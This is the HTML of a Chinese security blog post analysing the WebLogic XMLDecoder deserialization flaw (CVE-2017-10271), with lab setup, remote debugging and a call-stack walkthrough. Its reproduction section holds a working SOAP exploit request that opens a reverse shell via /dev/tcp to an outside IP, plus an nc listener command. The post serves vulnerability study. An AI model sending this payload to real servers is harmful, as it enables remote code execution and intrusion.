@@ -1,0 +1,1270 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Shu1L's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="WebLogic XMLDecoder反序列化漏洞weblogic简介​        Weblogic是美国Oracle公司出品的一个应用服务器(application server)，确切的说是一个基于Java EE架构的中间件，是用于开发、集成、部署和管理大型分布式Web应用、网络应用和 数据库应用的Java应用服务器。​        Weblogic将Java的动态功能和Java Ent">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebLogic XMLDecoder反序列化漏洞学习">
+<meta property="og:url" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/index.html">
+<meta property="og:site_name" content="Shu1L&#39;s blog">
+<meta property="og:description" content="WebLogic XMLDecoder反序列化漏洞weblogic简介​        Weblogic是美国Oracle公司出品的一个应用服务器(application server)，确切的说是一个基于Java EE架构的中间件，是用于开发、集成、部署和管理大型分布式Web应用、网络应用和 数据库应用的Java应用服务器。​        Weblogic将Java的动态功能和Java Ent">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206135828.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206135902.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206135929.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206141422.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207180841.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207125332.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207143625.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207143937.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206220029.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207130022.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207130400.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207181022.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207181140.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207131058.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207131154.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207131435.png">
+<meta property="og:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210207183630.png">
+<meta property="article:published_time" content="2021-02-08T17:16:21.000Z">
+<meta property="article:modified_time" content="2021-02-08T17:22:04.463Z">
+<meta property="article:author" content="Shu1L">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206135828.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/"/>
+
+
+
+
+
+  <title>WebLogic XMLDecoder反序列化漏洞学习 | Shu1L's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Shu1L's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一只菜鸟白帽子</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Shu1L's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">WebLogic XMLDecoder反序列化漏洞学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-02-09T01:16:21+08:00">
+                2021-02-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="WebLogic-XMLDecoder反序列化漏洞"><a href="#WebLogic-XMLDecoder反序列化漏洞" class="headerlink" title="WebLogic XMLDecoder反序列化漏洞"></a>WebLogic XMLDecoder反序列化漏洞</h1><h3 id="weblogic简介"><a href="#weblogic简介" class="headerlink" title="weblogic简介"></a>weblogic简介</h3><p>​        Weblogic是美国Oracle公司出品的一个应用服务器(application server)，确切的说是一个基于Java EE架构的中间件，是用于开发、集成、部署和管理大型分布式Web应用、网络应用和 数据库应用的Java应用服务器。<br>​        Weblogic将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的Java（Java EE）应用服务器软件之一，也是世界上第一个成功商业化的Java EE应用服务器，具有可扩展性、快速开发、灵活、可靠等优势。</p>
+<h4 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h4><p>一般使用的是10.3.6，这两个大版本也叫WebLogic Server 11g和WebLogic Server 12c。</p>
+<h3 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>​    weblogic “wls-wsat”组件在反序列化操作时使用了Oracle官方的JDK组件中”XMLDecoder”类进行XML反序列化操作引发了代码执行。</p>
+<p>XMLDecoder类用于读取使用XMLEncoder创建的XML文档</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20210206135828.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20210206135902.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20210206135929.png" alt=""></p>
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>使用vulhub中的docker搭建复现环境，搭建环境可以参考<a href="https://vulhub.org/#/docs/" target="_blank" rel="noopener">https://vulhub.org/#/docs/</a></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/vulhub/</span>vulhub<span class="regexp">/blob/m</span>aster<span class="regexp">/weblogic/</span>CVE-<span class="number">2017</span>-<span class="number">10271</span></span><br></pre></td></tr></table></figure>
+
+<p>因为要动态调试，需要开启一个远程调试的端口8053，所以将docker-compose.yml文件改动如下</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">version:</span> <span class="string">'2'</span><span class="string">services:</span>  </span><br><span class="line"><span class="string">weblogic:</span>    <span class="string">image:</span> vulhub/weblogic   </span><br><span class="line"><span class="string">ports:</span>     </span><br><span class="line">- <span class="string">"7001:7001"</span>     </span><br><span class="line">- <span class="string">"8453:8453"</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="QQ%E6%88%AA%E5%9B%BE20210206141422.png" alt=""></p>
+<h4 id="IDEA远程调试"><a href="#IDEA远程调试" class="headerlink" title="IDEA远程调试"></a>IDEA远程调试</h4><p>,关于Weblogic的远程调试方法可以参考:</p>
+<p><a href="https://github.com/Maskhe/javasec/blob/master/IDEA%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A72%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.md" target="_blank" rel="noopener">https://github.com/Maskhe/javasec/blob/master/IDEA%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A72%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.md</a></p>
+<p>使用idea打开拷贝出的项目文件，将项目中的/server/lib和modules这两个文件夹添加到library。</p>
+<p>添加后，就会发现里面的.jar和.war的包都可以点开了，并且可以搜索里面的一些类和字符串了。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20210207180841.png" alt=""></p>
+<p>然后我们在idea中设置remote debug，然后点击右上方的debug，出现如下字样，说明已经配置ok。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connected <span class="keyword">to</span> the target VM, addres<span class="variable">s:</span> <span class="string">'localhost:8453'</span>, transpor<span class="variable">t:</span> <span class="string">'socket'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="QQ%E6%88%AA%E5%9B%BE20210207125332.png" alt=""></p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>首先我们复现一下漏洞,在response中我们可以看到命令执行的调用栈。</p>
+<p>首先我们开一个nc监听。</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<p>然后直接拿vulhub上的poc打:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:7001</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">&lt;void class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">&lt;array class="java.lang.String" length="3"&gt;</span><br><span class="line">&lt;void index="0"&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="1"&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="2"&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.111.134/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method="start"/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell成功</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20210207143625.png" alt=""></p>
+<p>通过查看response中的xml数据，我们可以在&lt;ns2:frame /&gt;标签中看到调用栈。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20210207143937.png" alt=""></p>
+<p>其中重要的调用栈有如下一些方法:</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.jaxws</span><span class="selector-class">.workcontext</span><span class="selector-class">.WorkContextServerTube-</span>&gt;<span class="selector-tag">processRequest</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.jaxws</span><span class="selector-class">.workcontext</span><span class="selector-class">.WorkContextTube-</span>&gt;<span class="selector-tag">readHeaderOld</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.jaxws</span><span class="selector-class">.workcontext</span><span class="selector-class">.WorkContextServerTube-</span>&gt;<span class="selector-tag">receive</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.workarea</span><span class="selector-class">.WorkContextMapImpl-</span>&gt;<span class="selector-tag">receiveRequest</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.workarea</span><span class="selector-class">.WorkContextLocalMap-</span>&gt;<span class="selector-tag">receiveRequest</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.workarea</span><span class="selector-class">.spi</span><span class="selector-class">.WorkContextEntryImpl-</span>&gt;<span class="selector-tag">readEntry</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.workarea</span><span class="selector-class">.WorkContextXmlInputAdapter-</span>&gt;<span class="selector-tag">readUTF</span></span><br></pre></td></tr></table></figure>
+
+<p>我们接下来就根据上面复现得到的调用栈进行跟踪调试。</p>
+<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>根据poc找到问题出在<code>wls-wsat</code>，然后找到对应的wls-wsat.war包，打开后点击<code>web.xml</code>查看有哪些接口</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20210206220029.png" alt=""></p>
+<p>然后我们直接跟踪调用栈的第一个processRequest 方法。</p>
+<h4 id="weblogic-wsee-jaxws-workcontext-WorkContextServerTube"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextServerTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20210207130022.png" alt=""></p>
+<p>   这里的var1是传进来的XML数据。var3是soap头部解析的结果 不为空 于是 跟入readHeaderOld。</p>
+<h3 id="weblogic-wsee-jaxws-workcontext-WorkContextTube"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextTube" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextTube</h3><p><img src="QQ%E6%88%AA%E5%9B%BE20210207130400.png" alt=""></p>
+<p>在此方法中实例化了WorkContextXmlInputAdapter类，并且将获取到的XML格式的序列化数据传递到此类的构造方法中，之后跟进receive()</p>
+<h3 id="weblogic-wsee-jaxws-workcontext-WorkContextServerTube-1"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube-1" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextServerTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</h3><p>var2获取一个WorkContextMapImpl实例，然后调用receiveRequest方法将var1值传入。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20210207181022.png" alt=""></p>
+<p>继续跟进receiveRequest()</p>
+<h3 id="weblogic-workarea-WorkContextMapImpl"><a href="#weblogic-workarea-WorkContextMapImpl" class="headerlink" title="weblogic.workarea.WorkContextMapImpl"></a>weblogic.workarea.WorkContextMapImpl</h3><p><img src="QQ%E6%88%AA%E5%9B%BE20210207181140.png" alt=""></p>
+<p>将var1传到了receiveRequest()方法中，继续跟进</p>
+<h3 id="weblogic-workarea-WorkContextLocalMap"><a href="#weblogic-workarea-WorkContextLocalMap" class="headerlink" title="weblogic.workarea.WorkContextLocalMap"></a>weblogic.workarea.WorkContextLocalMap</h3><p><img src="QQ%E6%88%AA%E5%9B%BE20210207131058.png" alt=""></p>
+<p><code>WorkContextEntryImpl.readEntry(var1);</code>对传进来的数据进行处理，具体的代码好像看不太懂，但是跟进！readEntry()！</p>
+<h3 id="weblogic-workarea-spi-WorkContextEntryImpl"><a href="#weblogic-workarea-spi-WorkContextEntryImpl" class="headerlink" title="weblogic.workarea.spi.WorkContextEntryImpl"></a>weblogic.workarea.spi.WorkContextEntryImpl</h3><p><img src="QQ%E6%88%AA%E5%9B%BE20210207131154.png" alt=""></p>
+<p>继续跟进readUTF()：</p>
+<h3 id="weblogic-wsee-workarea-WorkContextXmlInputAdapter"><a href="#weblogic-wsee-workarea-WorkContextXmlInputAdapter" class="headerlink" title="weblogic.wsee.workarea.WorkContextXmlInputAdapter"></a>weblogic.wsee.workarea.WorkContextXmlInputAdapter</h3><p><img src="QQ%E6%88%AA%E5%9B%BE20210207131435.png" alt=""></p>
+<p>在这里就执行了this.xmlDecoder.readObject()，对XMLDecoder对象进行了反序列化，导致RCE。</p>
+<h4 id="调用栈总结"><a href="#调用栈总结" class="headerlink" title="调用栈总结"></a>调用栈总结</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20210207183630.png" alt=""></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://hu3sky.github.io/2019/10/16/weblogic/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://hu3sky.github.io/2019/10/16/weblogic/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></p>
+<p><a href="http://www.wxylyw.com/2018/11/03/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.wxylyw.com/2018/11/03/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+<p><a href="https://www.jianshu.com/p/5493f63fd7a0" target="_blank" rel="noopener">https://www.jianshu.com/p/5493f63fd7a0</a></p>
+<p><a href="https://github.com/Maskhe/javasec/blob/master/Weblogic%E4%B9%8BXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961%EF%BC%88CVE-2017-3506).md" target="_blank" rel="noopener">https://github.com/Maskhe/javasec/blob/master/Weblogic%E4%B9%8BXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961%EF%BC%88CVE-2017-3506).md</a></p>
+<p><a href="https://vulhub.org/#/environments/weblogic/CVE-2017-10271/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/CVE-2017-10271/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/" rel="next" title="Java安全--RMI基础学习">
+                <i class="fa fa-chevron-left"></i> Java安全--RMI基础学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/header.jpg"
+                alt="Shu1L" />
+            
+              <p class="site-author-name" itemprop="name">Shu1L</p>
+              <p class="site-description motion-element" itemprop="description">欢迎来到Shu1L的神秘小屋！</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">57</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">38</span>
